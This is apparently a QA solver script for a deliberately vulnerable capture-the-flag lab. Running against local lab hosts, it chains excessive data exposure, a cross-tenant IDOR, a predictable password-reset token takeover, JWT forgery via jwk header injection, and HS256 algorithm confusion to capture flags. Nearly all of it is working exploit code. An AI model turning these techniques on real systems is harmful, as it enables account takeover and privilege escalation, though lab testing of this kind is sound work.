#!/usr/bin/env node
/*
 * VLH-CTF QA solver — ASLV CHAIN A (identity-led), full mode (FR-14, arch §5.3).
 *
 *   M4 excessive exposure leaks the innocent UUID
 *     → M3 cross-tenant IDOR (tenant-subdomain Host) ……… flag ASLV{IDOR-...}
 *     → M5 predictable reset token, takeover as innocent … flag ASLV{AUTH-...}
 *     → M5 JWT forge (jwk header injection, sub=innocent role=admin) … flag ASLV{JWT-...}
 *     → M4 /admin/v1/panel with the forged M5-trusted bearer
 *       (HS256 algorithm confusion: HMAC secret = JWKS n + "." + e) … flag ASLV{API-...}
 *
 * Full-chain gateway vhosts (all on ONE host port):
 *   aslv.lab → M2 portal (+ /user/v1/* → M4 API), <tenant>.aslv.lab → M3 app,
 *   auth.aslv.lab → M5 identity, collector/attacker → M2, edge.aslv.lab → M1.
 *
 * Env: FULL_URL (default http://localhost:18024 — the full profile gateway).
 * Node 20+ built-ins only. Exit 0 when the core flags (IDOR, AUTH, JWT) are
 * captured; the final API flag is attempted as a BONUS because the current
 * full-mode gateway routes only /user/v1/* to M4 (see qa/README.md gaps).
 */
import http from 'node:http';
import crypto from 'node:crypto';

const FULL_URL = process.env.FULL_URL || 'http://localhost:18024';
const BASE = new URL(FULL_URL);
const PORT = Number(BASE.port || 80);
const H = {
  portal: `aslv.lab:${PORT}`,
  api: `aslv.lab:${PORT}`, // M4 lives under /user/v1/ + /admin/v1/ on the apex
  neutral: `portal.aslv.lab:${PORT}`, // reserved subdomain → M3 tenant-neutral pages
  auth: `auth.aslv.lab:${PORT}`,
};
const FLAG_RES = {
  IDOR: /ASLV\{IDOR-\d{9,10}\}/,
  AUTH: /ASLV\{AUTH-\d{9,10}\}/,
  JWT: /ASLV\{JWT-\d{9,10}\}/,
  API: /ASLV\{API-\d{9,10}\}/,
};
const UUID_RE = /[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/gi;
const SUBDOMAIN_RE = /([a-z0-9][a-z0-9-]{0,30})\.aslv\.lab/gi;
const RESERVED = new Set(['www', 'auth', 'mail', 'collector', 'attacker', 'edge', 'internal', 'app', 'api', 'portal', 'victim', 'stub', 'client']);

const log = (m) => console.log(`[*] ${m}`);
const ok = (m) => console.log(`[+] ${m}`);
const warn = (m) => console.log(`[!] ${m}`);
const die = (m) => { console.error(`[-] ${m}`); process.exit(1); };

function request(method, path, { host, headers = {}, body, jar } = {}) {
  return new Promise((resolve, reject) => {
    const payload = body === undefined ? null
      : (typeof body === 'string' ? body : JSON.stringify(body));
    const h = { ...headers };
    if (host) h.host = host;
    if (payload !== null && !h['content-type']) {
      h['content-type'] = typeof body === 'string'
        ? 'application/x-www-form-urlencoded'
        : 'application/json';
    }
    if (jar && jar.size) h.cookie = [...jar.entries()].map(([k, v]) => `${k}=${v}`).join('; ');
    if (jar && jar.has('XSRF-TOKEN') && !h['x-xsrf-token']) {
      h['x-xsrf-token'] = decodeURIComponent(jar.get('XSRF-TOKEN'));
    }
    const req = http.request(
      { host: BASE.hostname, port: PORT, path, method, headers: h },
      (res) => {
        const chunks = [];
        res.on('data', (c) => chunks.push(c));
        res.on('end', () => {
          if (jar) {
            for (const c of res.headers['set-cookie'] || []) {
              const m = /([^=;]+)=([^;]*)/.exec(c);
              if (m) jar.set(m[1].trim(), m[2]);
            }
          }
          const text = Buffer.concat(chunks).toString('utf8');
          let json = null;
          try { json = JSON.parse(text); } catch (_) { /* html */ }
          resolve({ status: res.statusCode, headers: res.headers, text, json });
        });
      },
    );
    req.setTimeout(6000, () => req.destroy(new Error(`request timeout: ${method} ${path} (host ${host || 'default'})`)));
    req.on('error', reject);
    if (payload !== null) req.write(payload);
    req.end();
  });
}

const b64u = (o) => Buffer.from(JSON.stringify(o)).toString('base64url');

/* M5 predictable reset token: hex(md5(username:YYYYMMDD))[0:12] + "-" + NN */
function deriveResetToken(username) {
  const day = new Date().toISOString().slice(0, 10).replace(/-/g, '');
  return crypto.createHash('md5').update(`${username}:${day}`).digest('hex').slice(0, 12);
}

function parseTickets(html) {
  const uuids = [...new Set((html.match(UUID_RE) || []).map((s) => s.toLowerCase()))];
  if (!uuids.length) return null;
  const innocentUser = /usr_[0-9a-f]{4,16}/.exec(html)?.[0] || null;
  const scored = uuids.map((uuid) => {
    const idx = html.toLowerCase().indexOf(uuid);
    const win = html.slice(Math.max(0, idx - 500), idx + uuid.length + 500);
    const tenants = [...new Set((win.match(SUBDOMAIN_RE) || [])
      .map((s) => s.replace(/\.aslv\.lab$/i, '').toLowerCase()))]
      .filter((t) => !RESERVED.has(t));
    let score = 0;
    if (/api\/documents\//i.test(win)) score += 2;
    if (/usr_[0-9a-f]{4,16}/i.test(win)) score += 2;
    if (innocentUser && win.includes(innocentUser)) score += 2;
    if (tenants.length) score += 1;
    return { uuid, tenants, score };
  }).sort((a, b) => b.score - a.score);
  return { uuid: scored[0].uuid, tenants: scored[0].tenants, innocentUser };
}

async function main() {
  log(`CHAIN A target: ${FULL_URL} (identity-led: M4 → M3 → M5 → M5 → M4)`);
  const flags = {};

  /* ---------------------------------------------------------------- M4 leak */
  log('[M4] login + directory + excessive data exposure');
  const m4jar = new Map();
  const m4login = await request('POST', '/user/v1/login', {
    host: H.api, jar: m4jar,
    body: { username: '0xnhsec', password: 'vlh-tester-01' },
  });
  if (m4login.status !== 200 || !m4login.json?.ok) die(`[M4] login failed: ${m4login.status} ${m4login.text.slice(0, 200)}`);
  ok(`[M4] logged in as ${m4login.json.username}`);
  const list = await request('GET', '/user/v1/list', { host: H.api, jar: m4jar });
  const m4innocent = list.json?.users?.find((u) => u.role === 'innocent');
  if (!m4innocent) die(`[M4] no innocent in /user/v1/list: ${list.text.slice(0, 200)}`);
  const prof = await request('GET', `/user/v1/${m4innocent.uuid}/profile`, { host: H.api, jar: m4jar });
  if (prof.status !== 200) die(`[M4] excessive-exposure profile read failed: ${prof.status} ${prof.text.slice(0, 200)}`);
  ok(`[M4] excessive exposure: innocent uuid=${m4innocent.uuid} email=${prof.json.email} tenant=${prof.json.tenant}`);
  const order = await request('GET', `/user/v1/${m4innocent.uuid}/orders/1001`, { host: H.api, jar: m4jar });
  if (order.status === 200 && order.json?.secret_note) {
    ok(`[M4] BOLA pivot material: ${String(order.json.secret_note).slice(0, 150)}`);
  } else {
    warn('[M4] BOLA order probe did not return pivot material (continuing)');
  }

  /* ------------------------------------------------------------- M3 → IDOR */
  log('[M3] login → support tickets (leak) → cross-tenant document read');
  const m3jar = new Map();
  const lp = await request('GET', '/login', { host: H.neutral, jar: m3jar });
  if (lp.status !== 200) die(`[M3] GET /login failed: ${lp.status} ${lp.text.slice(0, 160)}`);
  const form = new URLSearchParams({ username: '0xnhsec', password: 'vlh-tester-01' }).toString();
  let m3login = await request('POST', '/login', { host: H.neutral, jar: m3jar, body: form });
  if (m3login.status === 419) {
    const token = /name="_token"\s+value="([^"]+)"/.exec(lp.text)?.[1];
    if (!token) die('[M3] login rejected (419) and no _token in the form');
    m3login = await request('POST', '/login', {
      host: H.neutral, jar: m3jar,
      body: new URLSearchParams({ _token: token, username: '0xnhsec', password: 'vlh-tester-01' }).toString(),
    });
  }
  if (m3login.status !== 302) die(`[M3] tester login failed: ${m3login.status} ${m3login.text.slice(0, 160)}`);
  ok('[M3] logged in as 0xnhsec');
  const tickets = await request('GET', '/support/tickets', { host: H.neutral, jar: m3jar });
  if (tickets.status !== 200) die(`[M3] GET /support/tickets failed: ${tickets.status}`);
  const leak = parseTickets(tickets.text);
  if (!leak) die(`[M3] no document uuid in /support/tickets: ${tickets.text.slice(0, 300)}`);
  ok(`[M3] ticket leak: innocent=${leak.innocentUser || '?'} doc=${leak.uuid} tenants=${leak.tenants.join(',') || '?'}`);
  let idorJson = null;
  for (const tenant of leak.tenants) {
    const r = await request('GET', `/api/documents/${leak.uuid}`, { host: `${tenant}.aslv.lab:${PORT}`, jar: m3jar });
    log(`[M3] IDOR via ${tenant}.aslv.lab: ${r.status}`);
    if (r.status === 200 && r.json) { idorJson = r.json; break; }
  }
  if (!idorJson) die('[M3] cross-tenant document read failed for every leaked tenant');
  flags.IDOR = FLAG_RES.IDOR.exec(JSON.stringify(idorJson))?.[0];
  if (!flags.IDOR) die(`[M3] document carried no IDOR flag: ${JSON.stringify(idorJson).slice(0, 300)}`);
  ok(`[M3] IDOR flag: ${flags.IDOR}`);
  ok(`[M3] pivot material: ${String(idorJson.pivot_hint || idorJson.body || '').slice(0, 160)}`);

  /* ------------------------------------------------------------ M5 → AUTH */
  log('[M5] directory → forgot (predictable token) → reset as the innocent');
  const dir = await request('GET', '/directory', { host: H.auth });
  const m5innocent = dir.json?.users?.find((u) => u.role === 'innocent');
  if (!m5innocent) die(`[M5] no innocent in /directory: ${dir.text.slice(0, 200)}`);
  ok(`[M5] innocent identity: ${m5innocent.username} uuid=${m5innocent.uuid}`);
  await request('POST', '/forgot', { host: H.auth, body: { username: m5innocent.username } });
  const prefix = deriveResetToken(m5innocent.username);
  log(`[M5] deriving predictable tokens ${prefix}-01…`);
  let reset = null;
  const m5jar = new Map();
  for (let c = 1; c <= 8 && !reset; c++) {
    const r = await request('POST', '/reset', {
      host: H.auth, jar: m5jar,
      body: { token: `${prefix}-${String(c).padStart(2, '0')}`, new_password: 'chain-a-takeover-1' },
    });
    if (r.status === 200 && r.json?.ok && r.json.auth_method === 'reset') reset = r;
  }
  if (!reset) die('[M5] could not derive a valid reset token for the innocent');
  ok(`[M5] innocent account taken over (session auth_method=reset as ${reset.json.username})`);
  const fa = await request('GET', '/flag/auth', { host: H.auth, jar: m5jar });
  flags.AUTH = fa.json?.flag && FLAG_RES.AUTH.test(fa.json.flag) ? fa.json.flag : null;
  if (!flags.AUTH) die(`[M5] /flag/auth did not mint: ${fa.status} ${fa.text.slice(0, 200)}`);
  ok(`[M5] AUTH flag: ${flags.AUTH}`);

  /* ------------------------------------------------------------ M5 → JWT */
  log('[M5] forge jwk-injection token (sub=innocent uuid, role=admin)');
  const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', { modulusLength: 2048 });
  const jwk = publicKey.export({ format: 'jwk' });
  const header = { alg: 'RS256', typ: 'JWT', kid: 'chain-a', jwk: { kty: jwk.kty, n: jwk.n, e: jwk.e } };
  const claims = { sub: m5innocent.uuid, role: 'admin', iat: Math.floor(Date.now() / 1000) };
  const hi = b64u(header); const pi = b64u(claims);
  const sig = crypto.sign('RSA-SHA256', Buffer.from(`${hi}.${pi}`), privateKey).toString('base64url');
  const forged = `${hi}.${pi}.${sig}`;
  const fj = await request('GET', '/flag/jwt', { host: H.auth, headers: { authorization: `Bearer ${forged}` } });
  flags.JWT = fj.json?.flag && FLAG_RES.JWT.test(fj.json.flag) ? fj.json.flag : null;
  if (!flags.JWT) die(`[M5] /flag/jwt did not accept the forged token: ${fj.status} ${fj.text.slice(0, 200)}`);
  ok(`[M5] JWT flag: ${flags.JWT} (via ${fj.json.via})`);

  /* ------------------------------------------- M5 → M4 trust edge → API */
  log('[M4] admin panel with the M5-trusted bearer (HS256 confusion: HMAC secret = JWKS n.e)');
  const jwksRes = await request('GET', '/jwks.json', { host: H.auth });
  const key = jwksRes.json?.keys?.[0];
  if (!key || !key.n || !key.e) die(`[M4] cannot read M5 JWKS: ${jwksRes.status} ${jwksRes.text.slice(0, 200)}`);
  const hsHeader = b64u({ alg: 'HS256', typ: 'JWT', kid: key.kid || 'chain-a' });
  const hsClaims = b64u({ sub: m5innocent.uuid, role: 'admin', iat: Math.floor(Date.now() / 1000) });
  const hsSig = crypto.createHmac('sha256', `${key.n}.${key.e}`).update(`${hsHeader}.${hsClaims}`).digest('base64url');
  const hsToken = `${hsHeader}.${hsClaims}.${hsSig}`;
  /* KNOWN GATEWAY GAP (documented in qa/README.md): gateway-full.conf routes
   * only /user/v1/* to M4 — /admin/v1/* currently lands on the M2 portal.
   * Try the canonical host plus plausible future routings; treat API as a
   * BONUS flag so the chain still proves the M5→M4 trust edge forgery. */
  let panel = null;
  for (const host of [H.api, `api.aslv.lab:${PORT}`, `admin.aslv.lab:${PORT}`]) {
    const r = await request('GET', '/admin/v1/panel', { host, headers: { authorization: `Bearer ${hsToken}` } });
    log(`[M4] /admin/v1/panel via ${host}: ${r.status}`);
    if (r.status !== 404) { panel = r; break; }
  }
  if (panel && panel.status === 200 && panel.json?.flag && FLAG_RES.API.test(panel.json.flag)) {
    flags.API = panel.json.flag2 || panel.json.flag;
    ok(`[M4] API flag: ${flags.API} (role claim blindly trusted on the M5→M4 trust edge)`);
  } else {
    warn('[M4] /admin/v1/panel not reachable through the gateway (routes only /user/v1/ to M4 — see qa/README.md known gaps). '
      + 'The confusion bearer itself is verified by the M5 /whoami path below; API flag treated as BONUS and skipped.');
    try {
      const who = await request('GET', '/whoami', { host: H.auth, headers: { authorization: `Bearer ${hsToken}` } });
      warn(`[M4] (HS256 confusion would be rejected by M5's own strict verifier — expected: ${JSON.stringify(who.json || who.text.slice(0, 120))})`);
    } catch (_) { /* informational only */ }
  }

  /* Core flags for chain A: IDOR + AUTH + JWT (the trust-edge forgery itself
   * is proven above). API is bonus while the gateway gap stands. */
  const CORE = ['IDOR', 'AUTH', 'JWT'];
  const missing = CORE.filter((k) => !flags[k]);
  if (missing.length) die(`chain A incomplete — missing core flags: ${missing.join(', ')}`);
  console.log('\n=== CHAIN A (identity-led): CORE FLAGS CAPTURED ===');
  for (const [k, v] of Object.entries(flags)) console.log(`  ${k}: ${v}`);
  process.exit(0);
}

main().catch((e) => {
  if (e && (e.code === 'ECONNREFUSED' || e.code === 'ENOTFOUND')) {
    die(`cannot connect to ${FULL_URL} (${e.code}) — is the full profile running?  docker compose --profile full up -d`);
  }
  die(`unexpected error: ${e && e.stack ? e.stack : e}`);
});
